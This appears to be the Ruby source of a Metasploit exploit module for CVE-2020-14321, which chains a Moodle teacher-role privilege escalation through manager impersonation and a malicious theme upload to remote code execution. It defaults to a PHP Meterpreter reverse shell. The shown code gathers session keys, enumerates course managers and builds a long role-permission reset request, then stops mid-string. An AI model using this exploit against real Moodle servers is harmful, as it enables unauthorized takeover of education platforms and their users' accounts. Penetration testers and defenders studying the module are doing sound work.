##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking # due to needing a lot of things to go right

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Moodle

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Moodle Teacher Enrollment Privilege Escalation to RCE',
        'Description' => %q{
          Moodle version 3.9, 3.8 to 3.8.3, 3.7 to 3.7.6, 3.5 to 3.5.12 and earlier unsupported versions
          allow for a teacher to exploit chain to RCE.  A bug in the privileges system allows a teacher
          to add themselves as a manager to their own class. They can then add any other users, and thus
          look to add someone with manager privileges on the system (not just the class).  After
          adding a system manager, a 'loginas' feature is used to access their account.  Next the system
          is reconfigured to allow for all users to install an addon/plugin.  Then a malicious theme
          is uploaded and creates an RCE.

          If all of that is a success, we revert permissions for managers to system default and
          remove our malicoius theme.  Manual cleanup to remove students from the class is required.

          This module was tested against Moodle version 3.9
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'HoangKien1020', # Discovery, POC
          'lanz', # edb
          'h00die' # msf module
        ],
        'References' => [
          ['CVE', '2020-14321'],
          ['URL', 'https://moodle.org/mod/forum/discuss.php?d=407393'],
          ['URL', 'https://github.com/HoangKien1020/CVE-2020-14321'],
          ['EDB', '50180']
        ],
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Targets' => [['Automatic', {}]],
        'DefaultOptions' => { 'Payload' => 'php/meterpreter/reverse_tcp' },
        'DisclosureDate' => '2020-07-20',
        'Payload' => {
          'BadChars' => "'",
          'Space' => 6070 # apache default is 8196, but 35% overhead for base64 encoding
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'Username to authenticate with', '']),
        OptString.new('PASSWORD', [ true, 'Password to authenticate with', '']),
        OptInt.new('MAXUSERS', [true, 'Maximum amount of users to add to course looking for admin', 100])
      ]
    )
  end

  def get_user_info
    print_status('Retrieving user info')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'user', 'profile.php'),
      'keep_cookies' => true
    })
    fail_with(Failure::Unreachable, 'Error retrieving user id') unless res
    # user id
    res.body =~ /id=(\d)/
    userid = Regexp.last_match(1)
    # course id
    res.body =~ /course=(\d)/
    courseid = Regexp.last_match(1)
    # session key
    res.body =~ /"sesskey":"(.*?)"/
    sesskey = Regexp.last_match(1)
    return userid, courseid, sesskey
  end

  def get_course_managers(context_id)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'user', 'index.php'),
      'vars_get' =>
        {
          'roleid' => '1',
          'contextid' => context_id
        },
      'keep_cookies' => true
    })
    fail_with(Failure::Unreachable, 'Error retrieving settings') unless res
    return res.body.scan(/id=(\d)&amp;course/).flatten
  end

  def manager_default_permissions(sess_key)
    # reset Role archetype, Context types where this role may be assigned, and Permissions.
    "sesskey=#{sess_key}&return=define&resettype=none&savechanges=Save+changes&shortname=manager&name=&description=&archetype=manager&contextlevel10=0&contextlevel10=1&contextlevel30=0&contextlevel40=0&contextlevel40=1&contextlevel50=0&contextlevel50=1&contextlevel70=0&contextlevel80=0&allowassign%5B%5D=&allowassign%5B%5D=1&allowassign%5B%5D=2&allowassign%5B%5D=3&allowassign%5B%5D=4&allowassign%5B%5D=5&allowassign%5B%5D=6&allowassign%5B%5D=7&allowassign%5B%5D=8&allowoverride%5B%5D=&allowoverride%5B%5D=1&allowoverride%5B%5D=2&allowoverride%5B%5D=3&allowoverride%5B%5D=4&allowoverride%5B%5D=5&allowoverride%5B%5D=6&allowoverride%5B%5D=7&allowoverride%5B%5D=8&allowswitch%5B%5D=&allowswitch%5B%5D=1&allowswitch%5B%5D=2&allowswitch%5B%5D=3&allowswitch%5B%5D=4&allowswitch%5B%5D=5&allowswitch%5B%5D=6&allowswitch%5B%5D=7&allowswitch%5B%5D=8&allowview%5B%5D=&allowview%5B%5D=1&allowview%5B%5D=2&allowview%5B%5D=3&allowview%5B%5D=4&allowview%5B%5D=5&allowview%5B%5D=6&allowview%5B%5D=7&allowview%5B%5D=8&block%2Fadmin_bookmarks%3Amyaddinstance=0&block%2Fbadges%3Amyaddinstance=0&block%2Fcalendar_month%3Amyaddinstance=0&block%2Fcalendar_upcoming%3Amyaddinstance=0&block%2Fcomments%3Amyaddinstance=0&block%2Fcourse_list%3Amyaddinstance=0&block%2Fglobalsearch%3Amyaddinstance=0&block%2Fglossary_random%3Amyaddinstance=0&block%2Fhtml%3Amyaddinstance=0&block%2Flp%3Aaddinstance=0&block%2Flp%3Aaddinstance=1&block%2Flp%3Amyaddinstance=0&block%2Fmentees%3Amyaddinstance=0&block%2Fmnet_hosts%3Amyaddinstance=0&block%2Fmyoverview%3Amyaddinstance=0&block%2Fmyprofile%3Amyaddinstance=0&block%2Fnavigation%3Amyaddinstance=0&block%2Fnews_items%3Amyaddinstance=0&block%2Fonline_users%3Amyaddinstance=0&block%2Fprivate_files%3Amyaddinstance=0&block%2Frecentlyaccessedcourses%3Amyaddinstance=0&block%2Frecentlyaccesseditems%3Amyaddinstance=0&block%2Frss_client%3Amyaddinstance=0&block%2Fsettings%3Amyaddinstance=0&block%2Fstarredcourses%3Amyaddinstance=0&block%2Ftags%3Amyaddinstance=0&block%2Ftimeline%3Amyaddinstance=0&enrol%2Fcategory%3Asynchronised=0&message%2Fairnotifier%3Amanagedevice=0&moodle%2Fanalytics%3Alistowninsights=0&moodle%2Fanalytics%3Amanagemodels=0&moodle%2Fanalytics%3Amanagemodels=1&moodle%2Fbadges%3Amanageglobalsettings=0&moodle%2Fbadges%3Amanageglobalsettings=1&moodle%2Fblog%3Acreate=0&moodle%2Fblog%3Acreate=1&moodle%2Fblog%3Amanageentries=0&moodle%2Fblog%3Amanageentries=1&moodle%2Fblog%3Amanageexternal=0&moodle%2Fblog%3Amanageexternal=1&moodle%2Fblog%3Asearch=0&moodle%2Fblog%3Asearch=1&moodle%2Fblog%3Aview=0&moodle%2Fblog%3Aview=1&moodle%2Fblog%3Aviewdrafts=0&moodle%2Fblog%3Aviewdrafts=1&moodle%2Fcourse%3Aconfigurecustomfields=0&moodle%2Fcourse%3Arecommendactivity=0&moodle%2Fcourse%3Arecommendactivity=1&moodle%2Fgrade%3Amanagesharedforms=0&moodle%2Fgrade%3Amanagesharedforms=1&moodle%2Fgrade%3Asharegradingforms=0&moodle%2Fgrade%3Asharegradingforms=1&moodle%2Fmy%3Aconfigsyspages=0&moodle%2Fmy%3Aconfigsyspages=1&moodle%2Fmy%3Amanageblocks=0&moodle%2Fportfolio%3Aexport=0&moodle%2Fquestion%3Aconfig=0&moodle%2Fquestion%3Aconfig=1&moodle%2Frestore%3Acreateuser=0&moodle%2Frestore%3Acreateuser=1&moodle%2Frole%3Amanage=0&moodle%2Frole%3Amanage=1&moodle%2Fsearch%3Aquery=0&moodle%2Fsearch%3Aquery=1&moodle%2Fsite%3Aconfig=0&moodle%2Fsite%3Aconfigview=0&moodle%2Fsite%3Aconfigview=1&moodle%2Fsite%3Adeleteanymessage=0&moodle%2Fsite%3Adeleteanymessage=1&moodle%2Fsite%3Adeleteownmessage=0&moodle%2Fsite%3Adoclinks=0&moodle%2Fsite%3Adoclinks=1&moodle%2Fsite%3Aforcelanguage=0&moodle%2Fsite%3Amaintenanceaccess=0&moodle%2Fsite%3Amanageallmessaging=0&moodle%2Fsite%3Amanageallmessaging=1&moodle%2Fsite%3Amessageanyuser=0&moodle%2Fsite%3Amessageanyuser=1&moodle%2Fsite%3Amnetlogintoremote=0&moodle%2Fsite%3Areadallmessages=0&moodle%2Fsite%3Areadallmessages=1&moodle%2Fsite%3Asendmessage=0&moodle%2Fsite%3Asendmessage=1&moodle%2Fsite%3Auploadusers=0&moodle%2Fsite%3Auploadusers=1&moodle%2Fsite%3Aviewparticipants=0&moodle%2Fsite%3Aviewparticipants=1&moodle%2Ftag%3Aedit=0&moodle%2Ftag%3Aedit=1&moodle%2Ftag%3Aeditblocks=0&moodle%2Ftag%3Aeditblocks=1&moodle%2Ftag%3Aflag=0&moodle%2Ftag%3Amanage=0&moodle%2Ftag%3Amanage=1&moodle%2Fuser%3Achangeownpassword=0&moodle%2Fuser%3Achangeownpassword=1&moodle%2Fuser%3Acreate=0&moodle%2Fuser%3Acreate=1&moodle%2Fuser%3Adelete=0&moodle%2Fuser%3Adelete=1&moodle%2Fuser%3Aeditownmessageprofile=0&moodle%2Fuser%3Aeditownmessageprofile=1&moodle%2Fuser%3Aeditownprofile=0&moodle%2Fuser%3Aeditownprofile=1&moodle%2Fuser%3Aignoreuserquota=0&moodle%2Fuser%3Amanageownblocks=0&moodle%2Fuser%3Amanageownfiles=0&moodle%2Fuser%3Amanagesyspages=0&moodle%2Fuser%3Amanagesyspages=1&moodle%2Fuser%3Aupdate=0&moodle%2Fuser%3Aupdate=1&moodle%2Fwebservice%3Acreatemobiletoken=0&moodle%2Fwebservice%3Acreatetoken=0&moodle%2Fwebservice%3Acreatetoken=1&moodle%2Fwebservice%3Amanagealltokens=0&quizaccess%2Fseb%3Amanagetemplates=0&quizaccess%2Fseb%3Amanagetemplates=1&report%2Fcourseoverview%3Aview=0&report%2Fcourseoverview%3Aview=1&report%2Fperformance%3Aview=0&report%2Fperformance%3Aview=1&report%2Fquestioninstances%3Aview=0&report%2Fquestioninstances%3Aview=1&report%2Fsecurity%3Aview=0&report%2Fsecurity%3Aview=1&report%2Fstatus%3Aview=0&report%2Fstatus%3Aview=1&tool%2Fcustomlang%3Aedit=0&tool%2Fcustomlang%3Aedit=1&tool%2Fcustomlang%3Aview=0&tool%2Fcustomlang%3Aview=1&tool%2Fdataprivacy%3Amanagedataregistry=0&tool%2Fdataprivacy%3Amanagedatarequests=0&tool%2Fdataprivacy%3Arequestdeleteforotheruser=0&tool%2Flpmigrate%3Aframeworksmigrate=0&tool%2Flpmigrate%3Aframeworksmigrate=1&tool%2Fmonitor%3Amanagetool=0&tool%2Fmonitor%3Amanagetool=1&tool%2Fpolicy%3Aaccept=0&tool%2Fpolicy%3Amanagedocs=0&tool%2Fpolicy%3Amanagedocs=1&tool%2Fpolicy%3Aviewacceptances=0&tool%2Fpolicy%3Aviewacceptances=1&tool%2Fuploaduser%3Auploaduserpictures=0&tool%2Fuploaduser%3Auploaduserpictures=1&tool%2Fusertours%3Amanagetours=0&tool%2Fusertours%3Amanagetours=1&auth%2Foauth2%3Amanagelinkedlogins=0&moodle%2Fbadges%3Amanageownbadges=0&moodle%2Fbadges%3Aviewotherbadges=0&moodle%2Fcompetency%3Aevidencedelete=0&moodle%2Fcompetency%3Aplancomment=0&moodle%2Fcompetency%3Aplancomment=1&moodle%2Fcompetency%3Aplancommentown=0&moodle%2Fcompetency%3Aplanmanage=0&moodle%2Fcompetency%3Aplanmanage=1&moodle%2Fcompetency%3Aplanmanagedraft=0&moodle%2Fcompetency%3Aplanmanagedraft=1&moodle%2Fcompetency%3Aplanmanageown=0&moodle%2Fcompetency%3Aplanmanageowndraft=0&moodle%2Fcompetency%3Aplanrequestreview=0&moodle%2Fcompetency%3Aplanrequestreview=1&moodle%2Fcompetency%3Aplanrequestreviewown=0&moodle%2Fcompetency%3Aplanreview=0&moodle%2Fcompetency%3Aplanreview=1&moodle%2Fcompetency%3Aplanview=0&moodle%2Fcompetency%3Aplanview=1&moodle%2Fcompetency%3Aplanviewdraft=0&moodle%2Fcompetency%3Aplanviewdraft=1&moodle%2Fcompetency%3Aplanviewown=0&moodle%2Fcompetency%3Aplanviewowndraft=0&moodle%2Fcompetency%3Ausercompetencycomment=0&moodle%2Fcompetency%3Ausercompetencycomment=1&moodle%2Fcompetency%3Ausercompetencycommentown=0&moodle%2Fcompetency%3Ausercompetencyrequestreview=0&moodle%2Fcompetency%3Ausercompetencyrequestreview=1&moodle%2Fcompetency%3Ausercompetencyrequestreviewown=0&moodle%2Fcompetency%3Ausercompetencyreview=0&moodle%2Fcompetency%3Ausercompetencyreview=1&moodle%2Fcompetency%3Ausercompetencyview=0&moodle%2Fcompetency%3Ausercompetencyview=1&moodle%2Fcompetency%3Auserevidencemanage=0&moodle%2Fcompetency%3Auserevidencemanage=1&moodle%2Fcompetency%3Auserevidencemanageown=0&moodle%2Fcompetency%3Auserevidenceview=0&moodle%2Fcompetency%3Auserevidenceview=1&moodle%2Fuser%3Aeditmessageprofile=0&moodle%2Fuser%3Aeditmessageprofile=1&moodle%2Fuser%3Aeditprofile=0&moodle%2Fuser%3Aeditprofile=1&moodle%2Fuser%3Amanageblocks=0&moodle%2Fuser%3Areaduserblogs=0&moodle%2Fuser%3Areaduserblogs=1&moodle%2Fuser%3Areaduserposts=0&moodle%2Fuser%3Areaduserposts=1&moodle%2Fuser%3Aviewalldetails=0&moodle%2Fuser%3Aviewalldetails=1&moodle%2Fuser%3Aviewlastip=0&moodle%2Fuser%3Aviewlastip=1&moodle%2Fuser%3Aviewuseractivitiesreport=0&report%2Fusersessions%3Amanageownsessions=0&tool%2Fdataprivacy%3Adownloadallrequests=0&tool%2Fdataprivacy%3Adownloadownrequest=0&tool%2Fdataprivacy%3Amakedatadeletionrequestsforchildren=0&tool%2Fdataprivacy%3Amakedatarequestsforchildren=0&tool%2Fdataprivacy%3Arequestdelete=0&tool%2Fpolicy%3Aacceptbehalf=0&moodle%2Fcategory%3Amanage=0&moodle%2Fcategory%3Amanage=1&moodle%2Fcategory%3Aviewcourselist=0&moodle%2Fcategory%3Aviewhiddencategories=0&moodle%2Fcategory%3Aviewhiddencategories=1&moodle%2Fcohort%3Aassign=0&moodle%2Fcohort%3Aassign=1&moodle%2Fcohort%3Amanage=0&moodle%2Fcohort%3Amanage=1&moodle%2Fcompetency%3Acompetencymanage=0&moodle%2Fcompetency%3Acompetencymanage=1&moodle%2Fcompetency%3Acompetencyview=0&moodle%2Fcompetency%3Atemplatemanage=0&moodle%2Fcompetency%3Atemplatemanage=1&moodle%2Fcompetency%3Atemplateview=0&moodle%2Fcompetency%3Atemplateview=1&moodle%2Fcourse%3Acreate=0&moodle%2Fcourse%3Acreate=1&moodle%2Fcourse%3Arequest=0&moodle%2Fsite%3Aapprovecourse=0&moodle%2Fsite%3Aapprovecourse=1&repository%2Fcontentbank%3Aaccesscoursecategorycontent=0&repository%2Fcontentbank%3Aaccesscoursecategorycontent=1&repository%2Fcontentbank%3Aaccessgeneralcontent=0&block%2Frecent_activity%3Aviewaddupdatemodule=0&block%2Frecent_activity%3Aviewdeletemodule=0&contenttype%2Fh5p%3Aaccess=0&contenttype%2Fh5p%3Aaccess=1&contenttype%2Fh5p%3Aupload=0&contenttype%2Fh5p%3Aupload=1&contenttype%2Fh5p%3Auseeditor=0&contenttype%2Fh5p%3Auseeditor=1&enrol%2Fcategory%3Aconfig=0&enrol%2Fcategory%3Aconfig=1&enrol%2Fcohort%3Aconfig=0&enrol%2Fcohort%3Aconfig=1&enrol%2Fcohort%3Aunenrol=0&enrol%2Fcohort%3Aunenrol=1&enrol%2Fdatabase%3Aconfig=0&enrol%2Fdatabase%3Aconfig=1&enrol%2Fdatabase%3Aunenrol=0&enrol%2Fdatabase%3Aunenrol=1&enrol%2Fflatfile%3Amanage=0&enrol%2Fflatfile%3Aunenrol=0&enrol%2Fguest%3Aconfig=0&enrol%2Fguest%3Aconfig=1&enrol%2Fimsenterprise%3Aconfig=0&enrol%2Fimsenterprise%3Aconfig=1&enrol%2Fldap%3Amanage=0&enrol%2Fldap%3Amanage=1&enrol%2Flti%3Aconfig=0&enrol%2Flti%3Aconfig=1&enrol%2Flti%3Aunenrol=0&enrol%2Flti%3Aunenrol=1&enrol%2Fmanual%3Aconfig=0&enrol%2Fmanual%3Aconfig=1&enrol%2Fmanual%3Aenrol=0&enrol%2Fmanual%3Aenrol=1&enrol%2Fmanual%3Amanage=0&enrol%2Fmanual%3Amanage=1&enrol%2Fmanual%3Aunenrol=0&enrol%2Fmanual%3Aunenrol=1&enrol%2Fmanual%3Aunenrolself=0&enrol%2Fmeta%3Aconfig=0&enrol%2Fmeta%3Aconfig=1&enrol%2Fmeta%3Aselectaslinked=0&enrol%2Fmeta%3Aselectaslinked=1&enrol%2Fmeta%3Aunenrol=0&enrol%2Fmeta%3Aunenrol=1&enrol%2Fmnet%3Aconfig=0&enrol%2Fmnet%3Aconfig=1&enrol%2Fpaypal%3Aconfig=0&enrol%2Fpaypal%3Aconfig=1&enrol%2Fpaypal%3Amanage=0&enrol%2Fpaypal%3Amanage=1&enrol%2Fpaypal%3Aunenrol=0&enrol%2Fpaypal%3Aunenrol=1&enrol%2Fpaypal%3Aunenrolself=0&enrol%2Fself%3Aconfig=0&enrol%2Fself%3Aconfig=1&enrol%2Fself%3Aholdkey=0&enrol%2Fself%3Amanage=0&enrol%2Fself%3Amanage=1&enrol%2Fself%3Aunenrol=0&enrol%2Fself%3Aunenrol=1&enrol%2Fself%3Aunenrolself=0&gradeexport%2Fods%3Apublish=0&gradeexport%2Fods%3Apublish=1&gradeexport%2Fods%3Aview=0&gradeexport%2Fods%3Aview=1&gradeexport%2Ftxt%3Apublish=0&gradeexport%2Ftxt%3Apublish=1&gradeexport%2Ftxt%3Aview=0&gradeexport%2Ftxt%3Aview=1&gradeexport%2Fxls%3Apublish=0&gradeexport%2Fxls%3Apublish=1&gradeexport%2Fxls%3Aview=0&gradeexport%2Fxls%3Aview=1&gradeexport%2Fxml%3Apublish=0&gradeexport%2Fxml%3Apublish=1&gradeexport%2Fxml%3Aview=0&gradeexport%2Fxml%3Aview=1&gradeimport%2Fcsv%3Aview=0&gradeimport%2Fcsv%3Aview=1&gradeimport%2Fdirect%3Aview=0&gradeimport%2Fdirect%3Aview=1&gradeimport%2Fxml%3Apublish=0&gradeimport%2Fxml%3Apublish=1&gradeimport%2Fxml%3Aview=0&gradeimport%2Fxml%3Aview=1&gradereport%2Fgrader%3Aview=0&gradereport%2Fgrader%3Aview=1&gradereport%2Fhistory%3Aview=0&gradereport%2Fhistory%3Aview=1&gradereport%2Foutcomes%3Aview=0&gradereport%2Foutcomes%3Aview=1&gradereport%2Foverview%3Aview=0&gradereport%2Fsingleview%3Aview=0&gradereport%2Fsingleview%3Aview=1&gradereport%2Fuser%3Aview=0&gradereport%2Fuser%3Aview=1&mod%2Fassign%3Aaddinstance=0&mod%2Fassign%3Aaddinstance=1&mod%2Fassignment%3Aaddinstance=0&mod%2Fassignment%3Aaddinstance=1&mod%2Fbook%3Aaddinstance=0&mod%2Fbook%3Aaddinstance=1&mod%2Fchat%3Aaddinstance=0&mod%2Fchat%3Aaddinstance=1&mod%2Fchoice%3Aaddinstance=0&mod%2Fchoice%3Aaddinstance=1&mod%2Fdata%3Aaddinstance=0&mod%2Fdata%3Aaddinstance=1&mod%2Ffeedback%3Aaddinstance=0&mod%2Ffeedback%3Aaddinstance=1&mod%2Ffolder%3Aaddinstance=0&mod%2Ffolder%3Aaddinstance=1&mod%2Fforum%3Aaddinstance=0&mod%2Fforum%3Aaddinstance=1&mod%2Fglossary%3Aaddinstance=0&mod%2Fglossary%3Aaddinstance=1&mod%2Fh5pactivity%3Aaddinstance=0&mod%2Fh5pactivity%3Aaddinstance=1&mod%2Fimscp%3Aaddinstance=0&mod%2Fimscp%3Aaddinstance=1&mod%2Flabel%3Aaddinstance=0&mod%2Flabel%3Aaddinstance=1&mod%2Flesson%3Aaddinstance=0&mod%2Flesson%3Aaddinstance=1&mod%2Flti%3Aaddcoursetool=0&mod%2Flti%3Aaddcoursetool=1&mod%2Flti%3Aaddinstance=0&mod%2Flti%3Aaddinstance=1&mod%2Flti%3Aaddmanualinstance=0&mod%2Flti%3Aaddmanualinstance=1&mod%2Flti%3Aaddpreconfiguredinstance=0&mod%2Flti%3Aaddpreconfiguredinstance=1&mod%2Flti%3Arequesttooladd=0&mod%2Flti%3Arequesttooladd=1&mod%2Fpage%3Aaddinstance=0&mod%2Fpage%3Aaddinstance=1&mod%2Fquiz%3Aaddinstance=0&mod%2Fquiz%3Aaddinstance=1&mod%2Fresource%3Aaddinstance=0&mod%2Fresource%3Aaddinstance=1&mod%2Fscorm%3Aaddinstance=0&mod%2Fscorm%3Aaddinstance=1&mod%2Fsurvey%3Aaddinstance=0&mod%2Fsurvey%3Aaddinstance=1&mod%2Furl%3Aaddinstance=0&mod%2Furl%3Aaddinstance=1&mod%2Fwiki%3Aaddinstance=0&mod%2Fwiki%3Aaddinstance=1&mod%2Fworkshop%3Aaddinstance=0&mod%2Fworkshop%3Aaddinstance=1&moodle%2Fanalytics%3Alistinsights=0&moodle%2Fanalytics%3Alistinsights=1&moodle%2Fbackup%3Aanonymise=0&moodle%2Fbackup%3Aanonymise=1&moodle%2Fbackup%3Abackupcourse=0&moodle%2Fbackup%3Abackupcourse=1&moodle%2Fbackup%3Abackupsection=0&moodle%2Fbackup%3Abackupsection=1&moodle%2Fbackup%3Abackuptargetimport=0&moodle%2Fbackup%3Abackuptargetimport=1&moodle%2Fbackup%3Aconfigure=0&moodle%2Fbackup%3Aconfigure=1&moodle%2Fbackup%3Adownloadfile=0&moodle%2Fbackup%3Adownloadfile=1&moodle%2Fbackup%3Auserinfo=0&moodle%2Fbackup%3Auserinfo=1&moodle%2Fbadges%3Aawardbadge=0&moodle%2Fbadges%3Aawardbadge=1&moodle%2Fbadges%3Aconfigurecriteria=0&moodle%2Fbadges%3Aconfigurecriteria=1&moodle%2Fbadges%3Aconfiguredetails=0&moodle%2Fbadges%3Aconfiguredetails=1&moodle%2Fbadges%3Aconfiguremessages=0&moodle%2Fbadges%3Aconfiguremessages=1&moodle%2Fbadges%3Acreatebadge=0&moodle%2Fbadges%3Acreatebadge=1&moodle%2Fbadges%3Adeletebadge=0&moodle%2Fbadges%3Adeletebadge=1&moodle%2Fbadges%3Aearnbadge=0&moodle%2Fbadges%3Arevokebadge=0&moodle%2Fbadges%3Arevokebadge=1&moodle%2Fbadges%3Aviewawarded=0&moodle%2Fbadges%3Aviewawarded=1&moodle%2Fbadges%3Aviewbadges=0&moodle%2Fcalendar%3Amanageentries=0&moodle%2Fcalendar%3Amanageentries=1&moodle%2Fcalendar%3Amanagegroupentries=0&moodle%2Fcalendar%3Amanagegroupentries=1&moodle%2Fcalendar%3Amanageownentries=0&moodle%2Fcalendar%3Amanageownentries=1&moodle%2Fcohort%3Aview=0&moodle%2Fcohort%3Aview=1&moodle%2Fcomment%3Adelete=0&moodle%2Fcomment%3Adelete=1&moodle%2Fcomment%3Apost=0&moodle%2Fcomment%3Apost=1&moodle%2Fcomment%3Aview=0&moodle%2Fcomment%3Aview=1&moodle%2Fcompetency%3Acompetencygrade=0&moodle%2Fcompetency%3Acompetencygrade=1&moodle%2Fcompetency%3Acoursecompetencygradable=0&moodle%2Fcompetency%3Acoursecompetencymanage=0&moodle%2Fcompetency%3Acoursecompetencymanage=1&moodle%2Fcompetency%3Acoursecompetencyview=0&moodle%2Fcontentbank%3Aaccess=0&moodle%2Fcontentbank%3Aaccess=1&moodle%2Fcontentbank%3Adeleteanycontent=0&moodle%2Fcontentbank%3Adeleteanycontent=1&moodle%2Fcontentbank%3Adeleteowncontent=0&moodle%2Fcontentbank%3Amanageanycontent=0&moodle%2Fcontentbank%3Amanageanycontent=1&moodle%2Fcontentbank%3Amanageowncontent=0&moodle%2Fcontentbank%3Amanageowncontent=1&moodle%2Fcontentbank%3Aupload=0&moodle%2Fcontentbank%3Aupload=1&moodle%2Fcontentbank%3Auseeditor=0&moodle%2Fcontentbank%3Auseeditor=1&moodle%2Fcourse%3Abulkmessaging=0&moodle%2Fcourse%3Abulkmessaging=1&moodle%2Fcourse%3Achangecategory=0&moodle%2Fcourse%3Achangecategory=1&moodle%2Fcourse%3Achangefullname=0&moodle%2Fcourse%3Achangefullname=1&moodle%2Fcourse%3Achangeidnumber=0&moodle%2Fcourse%3Achangeidnumber=1&moodle%2Fcourse%3Achangelockedcustomfields=0&moodle%2Fcourse%3Achangelockedcustomfields=1&moodle%2Fcourse%3Achangeshortname=0&moodle%2Fcourse%3Achangeshortname=1&moodle%2Fcourse%3Achangesummary=0&moodle%2Fcourse%3Achangesummary=1&moodle%2Fcourse%3Acreategroupconversations=0&moodle%2Fcourse%3Acreategroupconversations=1&moodle%2Fcourse%3Adelete=0&moodle%2Fcourse%3Adelete=1&moodle%2Fcourse%3Aenrolconfig=0&moodle%2Fcourse%3Aenrolconfig=1&moodle%2Fcourse%3Aenrolreview=0&moodle%2Fcourse%3Aenrolreview=1&moodle%2Fcourse%3Aignorefilesizelimits=0&moodle%2Fcourse%3Aisincompletionreports=0&moodle%2Fcourse%3Amanagefiles=0&moodle%2Fcourse%3Amanagefiles=1&moodle%2Fcourse%3Amanagegroups=0&moodle%2Fcourse%3Amanagegroups=1&moodle%2Fcourse%3Amanagescales=0&moodle%2Fcourse%3Amanagescales=1&moodle%2Fcourse%3Amarkcomplete=0&moodle%2Fcourse%3Amarkcomplete=1&moodle%2Fcourse%3Amovesections=0&moodle%2Fcourse%3Amovesections=1&moodle%2Fcourse%3Aoverridecompletion=0&moodle%2Fcourse%3Aoverridecompletion=1&moodle%2Fcourse%3Arenameroles=0&moodle%2Fcourse%3Arenameroles=1&moodle%2Fcourse%3Areset=0&moodle%2Fcourse%3Areset=1&moodle%2Fcourse%3Areviewotherusers=0&moodle%2Fcourse%3Areviewotherusers=1&moodle%2Fcourse%3Asectionvisibility=0&moodle%2Fcourse%3Asectionvisibility=1&moodle%2Fcourse%3Asetcurrentsection=0&moodle%2Fcourse%3Asetcurrentsection=1&moodle%2Fcourse%3Asetforcedlanguage=0&moodle%2Fcourse%3Asetforcedlanguage=1&moodle%2Fcourse%3Atag=0&moodle%2Fcourse%3Atag=1&moodle%2Fcourse%3Aupdate=0&moodle%2Fcourse%3Aupdate=1&moodle%2Fcourse%3Auseremail=0&moodle%2Fcourse%3Auseremail=1&moodle%2Fcourse%3Aview=0&moodle%2Fcourse%3Aview=1&moodle%2Fcourse%3Aviewhiddencourses=0&moodle%2Fcourse%3Aviewhiddencourses=1&moodle%2Fcourse%3Aviewhiddensections=0&moodle%2Fcourse%3Aviewhiddensections=1&moodle%2Fcourse%3Aviewhiddenuserfields=0&moodle%2Fcourse%3Aviewhiddenuserfields=1&moodle%2Fcourse%3Aviewparticipants=0&moodle%2Fcourse%3Aviewparticipants=1&moodle%2Fcourse%3Aviewscales=0&moodle%2Fcourse%3Aviewscales=1&moodle%2Fcourse%3Aviewsuspendedusers=0&moodle%2Fcourse%3Aviewsuspendedusers=1&moodle%2Fcourse%3Avisibility=0&moodle%2Fcourse%3Avisibility=1&moodle%2Ffilter%3Amanage=0&moodle%2Ffilter%3Amanage=1&moodle%2Fgrade%3Aedit=0&moodle%2Fgrade%3Aedit=1&moodle%2Fgrade%3Aexport=0&moodle%2Fgrade%3Aexport=1&moodle%2Fgrade%3Ahide=0&moodle%2Fgrade%3Ahide=1&moodle%2Fgrade%3Aimport=0&moodle%2Fgrade%3Aimport=1&moodle%2Fgrade%3Alock=0&moodle%2Fgrade%3Alock=1&moodle%2Fgrade%3Amanage=0&moodle%2Fgrade%3Amanage=1&moodle%2Fgrade%3Amanagegradingforms=0&moodle%2Fgrade%3Amanagegradingforms=1&moodle%2Fgrade%3Amanageletters=0&moodle%2Fgrade%3Amanageletters=1&moodle%2Fgrade%3Amanageoutcomes=0&moodle%2Fgrade%3Amanageoutcomes=1&moodle%2Fgrade%3Aunlock=0&moodle%2Fgrade%3Aunlock=1&moodle%2Fgrade%3Aview=0&moodle%2Fgrade%3Aviewall=0&moodle%2Fgrade%3Aviewall=1&moodle%2Fgrade%3Aviewhidden=0&moodle%2Fgrade%3Aviewhidden=1&moodle%2Fnotes%3Amanage=0&moodle%2Fnotes%3Amanage=1&moodle%2Fnotes%3Aview=0&moodle%2Fnotes%3Aview=1&moodle%2Fquestion%3Aadd=0&moodle%2Fquestion%3Aadd=1&moodle%2Fquestion%3Aeditall=0&moodle%2Fquestion%3Aeditall=1&moodle%2Fquestion%3Aeditmine=0&moodle%2Fquestion%3Aeditmine=1&moodle%2Fquestion%3Aflag=0&moodle%2Fquestion%3Aflag=1&moodle%2Fquestion%3Amanagecategory=0&moodle%2Fquestion%3Amanagecategory=1&moodle%2Fquestion%3Amoveall=0&moodle%2Fquestion%3Amoveall=1&moodle%2Fquestion%3Amovemine=0&moodle%2Fquestion%3Amovemine=1&moodle%2Fquestion%3Atagall=0&moodle%2Fquestion%3Atagall=1&moodle%2Fquestion%3Atagmine=0&moodle%2Fquestion%3Atagmine=1&moodle%2Fquestion%3Auseall=0&moodle%2Fquestion%3Auseall=1&moodle%2Fquestion%3Ausemine=0&moodle%2Fquestion%3Ausemine=1&moodle%2Fquestion%3Aviewall=0&moodle%2Fquestion%3Aviewall=1&moodle%2Fquestion%3Aviewmine=0&moodle%2Fquestion%3Aviewmine=1&moodle%2Frating%3Arate=0&moodle%2Frating%3Arate=1&moodle%2Frating%3Aview=0&moodle%2Frating%3Aview=1&moodle%2Frating%3Aviewall=0&moodle%2Frating%3Aviewall=1&moodle%2Frating%3Aviewany=0&moodle%2Frating%3Aviewany=1&moodle%2Frestore%3Aconfigure=0&moodle%2Frestore%3Aconfigure=1&moodle%2Frestore%3Arestoreactivity=0&moodle%2Frestore%3Arestoreactivity=1&moodle%2Frestore%3Arestorecourse=0&moodle%2Frestore%3Arestorecourse=1&moodle%2Frestore%3Arestoresection=0&moodle%2Frestore%3Arestoresection=1&moodle%2Frestore%3Arestoretargetimport=0&moodle%2Frestore%3Arestoretargetimport=1&moodle%2F